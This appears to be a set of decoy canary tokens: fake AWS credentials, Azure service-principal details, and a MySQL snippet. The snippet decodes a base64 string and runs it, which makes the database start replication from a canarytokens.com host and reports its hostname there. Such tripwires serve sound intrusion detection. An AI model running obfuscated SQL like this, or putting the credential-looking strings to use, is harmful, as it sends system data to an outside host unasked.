aws_access_key_id = AKIAWG5BIHVT5HU4AKWM
aws_secret_access_key = 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


appId= '6b13352a-8cf5-4cac-9c72-6189b4ebf59c'
displayName = 'azure-cli-LlBRyVuBHLfjANvdec0kwfyTVH6XuexZ'


SET @b = 'U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIE1BU1RFUiBUTyBNQVNURVJfUEFTU1dPUkQ9J215LXNlY3JldC1wdycsIE1BU1RFUl9SRVRSWV9DT1VOVD0xLCBNQVNURVJfUE9SVD0zMzA2LCBNQVNURVJfSE9TVD0ncTRwcWEzdDgxbXNzcmZyODZhb3pyemJycC5jYW5hcnl0b2tlbnMuY29tJywgTUFTVEVSX1VTRVI9J3E0cHFhM3Q4MW1zc3Jmcjg2YW96cnpicnAiLCBAQGxjX3RpbWVfbmFtZXMsIEBAaG9zdG5hbWUsICInOyIpOw==';
SET @s2 = FROM_BASE64(@b);
PREPARE stmt1 FROM @s2;
EXECUTE stmt1;
PREPARE stmt2 FROM @bb;
EXECUTE stmt2;
START REPLICA;

[default]
aws_access_key_id = AKIA2OGYBAH66D3X5FFR
aws_secret_access_key = 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
output = json
region = us-east-2

ffdaye0jg6usp33u9jab6wf2i.canarytokens.com
                    

{
  "appId": "6b13352a-8cf5-4cac-9c72-6189b4ebf59c",
  "displayName": "azure-cli-F7c05qM5V8IfNVb7rbURbIFrFtfvrYVF",
  "fileWithCertAndPrivateKey": "Code_sign_server_3",
  "password": null,
  "tenant": "c5b88def-64d6-4276-aa23-feab7321ced5"
}
